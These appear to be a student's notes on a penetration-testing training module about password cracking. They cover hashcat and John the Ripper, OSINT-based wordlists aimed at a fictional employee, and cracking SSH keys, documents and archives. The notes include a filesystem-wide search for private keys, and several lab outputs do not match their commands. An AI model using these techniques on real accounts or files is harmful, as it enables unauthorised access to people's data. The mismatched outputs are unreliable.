# Introduction

`Confidentiality`, `integrity`, and `availability` are at the core of every infosec practitioner's responsibilities. Without maintaining a balance among them, we cannot ensure the security of our enterprises. This balance is preserved by auditing and accounting for each file, object, and host in the environment; by validating that users have appropriate permissions (authorization) to access those resources; and by verifying each user's identity (authentication) before granting access. Most breaches can be traced back to the breakdown of one of these three principles. This module focuses on attacking and bypassing the tenet of `authentication` by compromising user passwords across various operating systems, applications, and encryption methods. Before diving into the exciting part, `attacking passwords`, let's take a moment to discuss authentication and its components.
## Authentication

Authentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:

1. `Something you know`: a password, passcode, PIN, passphrase, etc.
2. `Something you have`: an ID card, smart card, trusted device/phone, etc.
3. `Something you are`: biometric characteristics such as fingerprint, face recognition, iris/retina, voice, etc.
4. `Somewhere you are`: geolocation, IP address, etc.

The process can require any or all of these authentication factors. These methods will be determined based on the severity of the information or systems accessed and how much protection they need. For example, doctors are often required to utilize a Common Access Card (CAC) paired with a pin-code or password to access any terminals that input or store patient data. Depending on the maturity of the organization's security posture, they could require all three types (A CAC, password, and pin from an authenticator app, for example).

Another simple example of this is access to our email address. The proof of information, in this case, would be the knowledge of the email address itself and the associated password. For example, a cell phone with `2FA` can be used. The third aspect can also play a role: the user's presence through biometric recognition such as a fingerprint or facial recognition.

In the previous example, the password is the authentication identifier that can be bypassed with different TTPs. This level is about authenticating the identity. Usually, only the owner and authenticating authority know the password. Authorization is carried out if the correct password is given to the authentication authority. Authorization, in this case, is the set of permissions that the user is granted upon successful authentication.
## The use of passwords

The most common and widely used authentication method is still the use of passwords. But what is a password? A password or passphrase can be generally defined as `a combination of letters, numbers, and symbols in a string for identity validation.` For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of `36⁸` (`208,827,064,576`) possible passwords.

Realistically, it doesn't need to be a combination of those things. It could be a lyric from a song or poem, a line from a book, a phrase you can remember, or even randomly generated words concatenated together like "TreeDogEvilElephant." The key is for it to meet or exceed the security standards in place by your organization. Using multiple layers to establish identity can make the entire authentication process complicated and costly. Adding complexity to the authentication process creates further effort that can add to the stresses and workload a person may have during a typical workday. Complex systems can often require inconvenient manual processes or additional steps that could significantly complicate the interaction and `user experience` (`UX`). Consider the process of shopping at an online store. Creating an account on the store website can make the authentication and checkout processes much faster than manually inputting your personal information each time you wish to make a purchase. For this reason, using a username and password to secure an account is the most widespread method of authentication that we will see again and again while keeping in mind this balance of convenience and security.

A [survey](https://web.archive.org/web/20201115110047/https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf) conducted by Google and Harris Poll in 2019 reveals that `24% of Americans` have used passwords like `123456`, `qwerty` and `password`. At the time, only `15% of Americans` used password managers. It is also stated that `22%` used their `name`, and `33%` used the name of their `pet` or `children`. Another critical statistic is the `password re-use` across multiple accounts being `66%`. This means that 66% of all Americans, according to this statistic, have used the same password for multiple platforms. Therefore, once we have obtained or guessed a password, there is a 66% chance that we could use it to authenticate ourselves on other platforms with the user's ID (username or email address). This would, of course, require that we are able to guess the user's user ID, which, in many cases, is not difficult to do.

[Statistics](https://web.archive.org/web/20250405101232/https://www.pandasecurity.com/en/mediacenter/password-statistics/) compiled by Panda Security in 2025 show that these trends remain similar, with some signs of improvement. `123456` is still the most common password, appearing `4.5 million times` in data breaches, and at least `23%` reuse passwords across three accounts or more. However, `36% of Americans` have adopted password managers, which is more than double the figure from 6 years prior.

One aspect of Google's survey that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that `55% still keep the password` even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is [HaveIBeenPwned](https://haveibeenpwned.com/). We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.
## Digging in

Now that we have defined what a password is, how we use them, and common security principles, let's dive into how we store passwords and other credentials.

---
# Password Cracking Techniques
## Introduction to Password Cracking

Passwords are commonly `hashed` when stored, in order to provide some protection in the event they fall into the hands of an attacker. `Hashing` is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are `MD5`, and `SHA-256`.

Take the password `Soccer06!` for example. The corresponding `MD5` and `SHA-256` hashes can be generated with the following commands:

```
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

Hash functions are designed to work in `one direction`. This means it should not be possible to figure out what the original password was based on the hash alone. When attackers attempt to do this, it is called `password cracking`. Common techniques are to use `rainbow tables`, to perform `dictionary attacks`, and typically as a last resort, to perform `brute-force attacks`.
### Rainbow tables

Rainbow tables are large pre-compiled maps of input and output values for a given hash function. These can be used to very quickly identify the password if its corresponding hash has already been mapped.

| Password  | MD5 Hash                         |
| --------- | -------------------------------- |
| 123456    | e10adc3949ba59abbe56e057f20f883e |
| 12345     | 827ccb0eea8a706c4c34a16891f84e7b |
| 123456789 | 25f9e794323b453885f5181f1b624d0b |
Because rainbow tables are such a powerful attack, `salting` is used. A `salt`, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed. To maximize impact, salts should not be reused, e.g. for all passwords stored in one database. For example, if the salt `Th1sIsTh3S@lt_` is prepended to the same password, the MD5 hash would now be as follows:

```
mdn0x@htb[/htb]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum

90a10ba83c04e7996bc53373170b5474  -
```

A salt is not a secret value — when a system goes to check an authentication request, it needs to know what salt was used so that it can check if the password hash matches. For this reason, salts are typically prepended to corresponding hashes. The reason this technique works against rainbow tables is that even if the correct password has been mapped, the combination of salt and password has likely not (especially if the salt contains non-printable characters). To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of `just one single byte` would mean the `15 billion` entries from before would have to be `3.84 trillion` (factor of 256).
### Brute-force attack

A `brute-force` attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (<9 characters) are viable targets, even on consumer hardware. Brute-forcing is the only password cracking technique that is `100% effective` - in that, given enough time, any password will be cracked with this technique. That said, it is hardly ever used because of how much time it takes for stronger passwords, and is typically replaced by much more efficient `mask attacks`. This is something we will cover in the next couple sections.

**Note:** Brute-forcing speeds depend heavily on the hashing algorithm and hardware that is used. On a typical company laptop, a tool like `hashcat` might be able to guess over `five million` passwords per second when attacking MD5, while at the same time only managing `ten thousand` per second when targeting a DCC2 hash.
### Dictionary attack

A `dictionary` attack, otherwise known as a `wordlist` attack, is one of the most `efficient` techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) and those included in [SecLists](https://github.com/danielmiessler/SecLists).

```bash
mdn0x@htb[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt 
```

**Note:** `rockyou.txt` is a list of over `14 million` real passwords that were leaked when the `RockYou` website was hacked in 2009. Surprisingly, the company made the decision to store all user passwords unencrypted!
### Q&A

What is the SHA1 hash for `Academy#2025`?

```
└─$ echo -n Academy#2025 | sha1sum  
750fe4b402dc9f91cedf09b652543cd85406be8c  -
```

## Introduction to John The Ripper

[JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) (aka. `JtR` aka. `john`) is a well-known penetration testing tool used for cracking passwords through various attacks including brute-force and dictionary. It is open-source software initially developed for UNIX-based systems and was first released in 1996. It has become a staple of the security industry due to its various capabilities. The `"jumbo"` variant is recommended for our uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed. Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.
### Cracking modes

`Single crack mode` is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and [GECOS](https://en.wikipedia.org/wiki/Gecos_field) values (full name, room number, phone number, etc.). These strings are run against a large set of rules that apply common string modifications seen in passwords (e.g. a user whose real name is `Bob Smith` might use `Smith1` as their password).

```bash
mdn0x@htb[/htb]$ john --single passwd
```
### Wordlist mode

```bash
mdn0x@htb[/htb]$ john --wordlist=<wordlist_file> <hash_file>
```

The wordlist file (or files) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the `--rules` argument. These can be applied to generate candidate passwords using transformations such as appending numbers, capitalizing letters and adding special characters.
### Incremental mode

`Incremental mode` is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model ([Markov chains](https://en.wikipedia.org/wiki/Markov_chain)). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.

This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist, in contrast to wordlist mode. Unlike purely random brute-force attacks, Incremental mode uses a statistical model to make educated guesses, resulting in a significantly more efficient approach than naïve brute-force attacks.

```bash
mdn0x@htb[/htb]$ john --incremental <hash_file>
```

By default, JtR uses predefined incremental modes specified in its configuration file (`john.conf`), which define character sets and password lengths. You can customize these or define your own to target passwords that use special characters or specific patterns.
### Identifying hash formats

One way to get an idea is to consult [JtR's sample hash documentation](https://openwall.info/wiki/john/sample-hashes), or [this list by PentestMonkey](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats). Both sources list multiple example hashes as well as the corresponding JtR format. Another option is to use a tool like [hashID](https://github.com/psypanda/hashID), which checks supplied hashes against a built-in list to suggest potential formats. By adding the `-j` flag, [HashIdentifier](../../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md) will, in addition to the hash format, list the corresponding JtR format:

```bash
mdn0x@htb[/htb]$ hashid -j 193069ceb0461e1d40d216e32c79c704
```

Unfortunately, in our example it is still quite unclear what format the hash is in. This will sometimes be the case, and is simply one of the "problems" you will encounter as a pentester. Many times, the context of where the hash came from will be enough to make an educated case on the format. In this specific example, the hash format is RIPEMD-128.

JtR supports hundreds of hash formats, some of which are listed in the table below. The `--format` argument can be supplied to instruct JtR which format target hashes have.
### Cracking files

It is also possible to crack password-protected or encrypted files with JtR. Multiple `"2john"` tools come with JtR that can be used to process files and produce hashes compatible with JtR. The generalized syntax for these tools is:

```bash
mdn0x@htb[/htb]$ <tool> <file_to_crack> > file.hash
```

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
```bash
mdn0x@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
```
### Exercise

Use single-crack mode to crack r0lf's password.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --single hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
NAITSABES        (r0lf)     
1g 0:00:00:00 DONE (2026-11-15 20:26) 8.333g/s 5600p/s 5600c/s 5600C/s NAITSABES..0lfS
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --format=ripemd-128 ripemd-128 
Using default input encoding: UTF-8
Loaded 1 password hash (ripemd-128, RIPEMD 128 [32/64])
Warning: no OpenMP support for this hash type, consider --fork=12
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Enabling duplicate candidate password suppressor using 256 MiB
50cent           (?)     
1g 0:00:00:00 DONE 2/3 (2026-11-15 20:30) 14.29g/s 31085p/s 31085c/s 31085C/s samsung..santiago
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Introduction to Hashcat

[Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Similar to JtR, hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.

The general syntax used to run hashcat is as follows:

```bash
mdn0x@htb[/htb]$ hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

In the command above:

- `-a` is used to specify the `attack mode`
- `-m` is used to specify the `hash type`
- `<hashes>` is a either a hash string, or a file containing one or more password hashes of the same type
- `[wordlist, rule, mask, ...]` is a placeholder for additional arguments that depend on the attack mode
### Hash types

Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running `hashcat --help`.

The hashcat website hosts a comprehensive list of [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) which can assist in manually identifying an unknown hash type and determining the corresponding Hashcat hash mode identifier.

Alternatively, [hashID](https://github.com/psypanda/hashID) can be used to quickly identify the hashcat hash type by specifying the `-m` argument.

```
mdn0x@htb[/htb]$ hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```
### Attack modes

Hashcat has many different attack mode, including `dictionary`, `mask`, `combinator`, and `association`. In this section we will go over the first two, as they are likely the most common ones that you will need to use.

#### Dictionary attack

[Dictionary attack](https://hashcat.net/wiki/doku.php?id=dictionary_attack) (`-a 0`) is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.

As an example, imagine we extracted the following password hash from an SQL database: `e3e3ec5831ad5e7288241960e5d4fdb8`. First, we could identify this as an MD5 hash, which has a hash ID of `0`. To attempt to crack this hash using the `rockyou.txt` wordlist, the following command would be used:

```bash
mdn0x@htb[/htb]$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

A wordlist alone is often not enough to crack a password hash. As was the case with JtR, `rules` can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under `/usr/share/hashcat/rules`:

```
mdn0x@htb[/htb]$ ls -l /usr/share/hashcat/rules
```

As another example, imagine an additional md5 hash was leaked from the SQL database: `1b0556a75770563578569ae21392630c`. We weren't able to crack it using `rockyou.txt` alone, so in a subsequent attempt, we might apply some common rule-based transformations. One ruleset we could try is `best64.rule`, which contains 64 standard password modifications—such as appending numbers or substituting characters with their "leet" equivalents. To perform this kind of attack, we would append the `-r <ruleset>` option to the command, as shown below:

```
mdn0x@htb[/htb]$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
#### Mask attack

[Mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack) (`-a 3`) is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.

A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set. Hashcat includes several built-in character sets:

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |

Custom charsets can be defined with the `-1`, `-2`, `-3`, and `-4` arguments, then referred to with `?1`, `?2`, `?3`, and `?4`.

Let's say that we specifically want to try passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol. The resulting [[Hashcat]] mask would be `?u?l?l?l?l?d?s`.

```bash
mdn0x@htb[/htb]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

### Exercise

Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
e3e3ec5831ad5e7288241960e5d4fdb8:crazy!  
```

Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
1b0556a75770563578569ae21392630c:c0wb0ys1 
```


Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

```bash
mdn0x@htb[/htb]$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
1e293d6912d074c0fd15844d803400dd:Mouse5!
```

## Writing Custom Wordlists and Rules

Many users create their passwords based on `simplicity rather than security`. To mitigate this human tendency (which often undermines security measures), password policies can be implemented on systems to enforce specific password requirements. For instance, a system might enforce the inclusion of uppercase letters, special characters, and numbers. Most password policies mandate a minimum length—typically eight characters—and require at least one character from each specified category.

In the previous sections, we were successful at guessing simple passwords. However, it becomes significantly more challenging to apply these techniques to systems that require users to create more complex passwords.

Unfortunately, the tendency for users to create weak passwords occurs even when password policies are in place. Most individuals follow predictable patterns when creating passwords, often incorporating words closely related to the service being accessed. For example, many employees choose passwords that include the company's name. Personal preferences and interests also play a significant role—these may include references to pets, friends, sports, hobbies, and other aspects of daily life. Basic OSINT (Open Source Intelligence) techniques can be highly effective in uncovering such personal information and may assist in password guessing. More information about OSINT can be found in the [OSINT: Corporate Recon module](https://academy.hackthebox.com/course/preview/osint-corporate-recon).

Commonly, users use the following additions for their password to fit the most common password policies:

|**Description**|**Password Syntax**|
|---|---|
|First letter is uppercase|`Password`|
|Adding numbers|`Password123`|
|Adding year|`Password2022`|
|Adding month|`Password02`|
|Last character is an exclamation mark|`Password2022!`|
|Adding special characters|`P@ssw0rd2022!`|
Knowing that users tend to keep their passwords as simple as possible, we can create rules to generate likely weak passwords. According to statistics provided by [WP Engine](https://wpengine.com/resources/passwords-unmasked-infographic/), most passwords are no longer than `ten` characters. One approach is to select familiar terms that are at least five characters long—such as pet names, hobbies, personal preferences, or other common interests. For instance, if a user selects a single word (e.g., the current month), appends the current year, and adds a special character at the end, the result may satisfy a typical ten-character password requirement. Considering that most organizations require regular password changes, a user might modify their password by simply changing the name of the month or incrementing a single digit.

We can use [[Hashcat]] to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations. The complete syntax is documented in the official [Hashcat rule-based attack documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack), but the examples below are sufficient to understand how Hashcat mutates input words.

|**Function**|**Description**|
|---|---|
|`:`|Do nothing|
|`l`|Lowercase all letters|
|`u`|Uppercase all letters|
|`c`|Capitalize the first letter and lowercase others|
|`sXY`|Replace all instances of X with Y|
|`$!`|Add the exclamation character at the end|
We can use the following command to apply the rules in `custom.rule` to each word in `password.list` and store the mutated results in `mut_password.list`.

```bash
mdn0x@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Hashcat and JtR both come with pre-built rule lists that can be used for password generation and cracking. One of the most effective and widely used rulesets is `best64.rule`, which applies common transformations that frequently result in successful password guesses. It is important to note that password cracking and the creation of custom wordlists are, in most cases, a guessing game. We can narrow this down and perform more targeted guessing if we have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords have been leaked and directly obtained.

### CeWL

We can use a tool called [[Cewl]] to scan potential words from a company's website and save them in a separate list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee. We specify some parameters, like the depth to spider (`-d`), the minimum length of the word (`-m`), the storage of the found words in lowercase (`--lowercase`), as well as the file where we want to store the results (`-w`).

```bash
mdn0x@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
mdn0x@htb[/htb]$ wc -l inlane.wordlist

326
```
## Exercise

For this sections exercise, imagine that we compromised the password hash of a `work email` belonging to `Mark White`. After performing a bit of [[OSINT]], we have gathered the following information about Mark:

- He was born on `August 5, 1998`
- He works at `Nexura, Ltd.`
- The company's password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number
- He lives in `San Francisco, CA, USA`
- He has a pet cat named `Bella`
- He has a wife named `Maria`
- He has a son named `Alex`
- He is a big fan of `baseball`

The password hash is: `97268a8ae45ac7d15c3cea4ce6ea550b`. Use the techniques covered in this section to generate a custom wordlist and ruleset targeting Mark specifically, and crack the password.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ hashcat -a 3 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b '?u?l?l?l?l?l?l?l?l?l?d?s'
97268a8ae45ac7d15c3cea4ce6ea550b:Baseball1998!
```

## Cracking Protected Files

The use of file encryption is often neglected in both `private` and `professional` contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the [General Data Protection Regulation (GDPR)](https://gdpr-info.eu/) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss `confidential` topics or transmit `sensitive` data via email, which may be intercepted by attackers positioned to exploit these communication channels.

As more companies enhance their IT security infrastructure through training programs and security awareness seminars, it is becoming increasingly common for employees to encrypt sensitive files. Nevertheless, encrypted files can still be cracked and accessed with the right combination of wordlists and tools. In many cases, `symmetric encryption` algorithms such as `AES-256` are used to securely store individual files or folders. In this method, the same key is used for both encryption and decryption. For transmitting files, `asymmetric encryption` is typically employed, which uses two distinct keys: the sender encrypts the file with the recipient's `public key`, and the recipient decrypts it using the corresponding `private ke`y.

Up until now, we've focused on cracking password hashes specifically. In the next two sections, we will shift our focus to techniques related to attacking password-protected files and archives.

Many different extensions correspond to encrypted files—a useful reference list can be found on [FileInfo](https://fileinfo.com/filetypes/encoded). As an example, consider this command we might use to locate commonly encrypted files on a Linux system:

```bash
mdn0x@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

If we encounter file extensions on a system that we are unfamiliar with, we can use search engines to research the technology behind them. There are, after all, hundreds of different file extensions, and no one is expected to know all of them by heart.

Certain files, such as SSH keys, do not have standard file extension. In cases like these, it may be possible to identify files by standard content such as header and footer values. For example, SSH private keys always begin with `-----BEGIN [...SNIP...] PRIVATE KEY-----`. We can use tools like `grep` to recursively search the file system for them during post-exploitation.

```bash
mdn0x@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Some SSH keys are encrypted with a passphrase. With older PEM formats, it was possible to tell if an SSH key is encrypted based on the header, which contains the encryption method in use. Modern SSH keys, however, appear the same whether encrypted or not.

```bash
mdn0x@htb[/htb]$ cat /home/jsmith/.ssh/SSH.private
```

One way to tell whether an SSH key is encrypted or not, is to try reading the key with `ssh-keygen`.

```bash
mdn0x@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 
```

As shown below, attempting to read a password-protected SSH key will prompt the user for a passphrase:

```bash
mdn0x@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

As mentioned in a previous section, JtR has many different scripts for extracting hashes from files—which we can then proceed to crack. We can find these scripts on our system using the following command:

```bash
mdn0x@htb[/htb]$ locate *2john*
```

For example, we could use the Python script `ssh2john.py` to acquire the corresponding hash for an encrypted SSH key, and then use JtR to try and crack it.

```bash
mdn0x@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
mdn0x@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
```

We can then view the resulting hash:

```bash
john ssh.hash --show
```
### Cracking password-protected documents

Over the course of our careers, we are likely to encounter a wide variety of documents that are password-protected to restrict access to authorized individuals. Today, most reports, documentation, and information sheets are commonly distributed as Microsoft Office documents or PDFs. John the Ripper (JtR) includes a Python script called `office2john.py`, which can be used to extract password hashes from all common Office document formats. These hashes can then be supplied to JtR or Hashcat for offline cracking. The cracking procedure remains consistent with other hash types.

```bash
mdn0x@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
mdn0x@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
mdn0x@htb[/htb]$ john protected-docx.hash --show
```

The process for cracking PDF files is quite similar, as we simply swap out `office2john.py` for `pdf2john.py`.

```bash
mdn0x@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
mdn0x@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
mdn0x@htb[/htb]$ john pdf.hash --show
```

One of the primary challenges in this process is the generation and mutation of password lists, which is a prerequisite for successfully cracking password-protected files and access points. In many cases, using a standard or publicly known password list is no longer sufficient, as such lists are often recognized and blocked by built-in security mechanisms. These files may also be more difficult to crack—or not crackable at all within a reasonable timeframe—because users are increasingly required to choose longer, randomly generated passwords or complex passphrases. Nevertheless, attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.
## Exercise

Download the attached ZIP archive (cracking-protected-files.zip), and crack the file within. What is the password?

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ unzip c2d77580-c371-45c4-9af4-e964d8bdeef4.zip Confidential.xlsx

─$ office2john Confidential.xlsx > hash
─$ john hash 

beethoven        (Confidential.xlsx)
```

## Cracking Protected Archives

Besides standalone files, we will often run across `archives` and `compressed files`—such as ZIP files—which are protected with a password.

Let us assume the role of an employee at an administrative company and imagine that a client requests a summary of an analysis in various formats, such as Excel, PDF, Word, and a corresponding presentation. One approach would be to send these files individually. However, if we extend this scenario to a large organization managing multiple simultaneous projects, this method of file transfer can become cumbersome and may result in individual files being misplaced. In such cases, employees often rely on archive files, which allow them to organize necessary documents in a structured manner (typically using subfolders) before compressing them into a single, consolidated file.

There are many types of archive files. Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

A comprehensive list of archive file types can be found on [FileInfo](https://fileinfo.com/filetypes/compressed). Rather than typing them out manually, we can also query the data using a one-liner, apply filters as needed, and save the results to a file. At the time of writing, the website lists `365` archive file types.

```bash
mdn0x@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

Note that not all archive types support native password protection, and in such cases, additional tools are often used to encrypt the files. For example, TAR files are commonly encrypted using `openssl` or `gpg`.

Given the wide variety of archive formats and encryption tools, this section will focus only on a selection of methods for cracking specific archive types. For password-protected archives, we typically require specialized scripts to extract password hashes from the files, which can then be used in offline cracking attempts.
### Cracking ZIP files

The `ZIP` format is often heavily used in Windows environments to compress many files into one file. The process of cracking an encrypted ZIP file is similar to what we have seen already, except for using a different script to extract the hashes.

```bash
mdn0x@htb[/htb]$ zip2john ZIP.zip > zip.hash
mdn0x@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
```
### Cracking OpenSSL encrypted GZIP files

It is not always immediately apparent whether a file is password-protected, particularly when the file extension corresponds to a format that does not natively support password protection. As previously discussed, `openssl` can be used to encrypt files in the `GZIP` format. To determine the actual format of a file, we can use the `file` command, which provides detailed information about its contents. For example:

```bash
mdn0x@htb[/htb]$ file GZIP.gzip 
```

When cracking OpenSSL encrypted files, we may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the `openssl` tool within a `for` loop that attempts to extract the contents directly, succeeding only if the correct password is found.

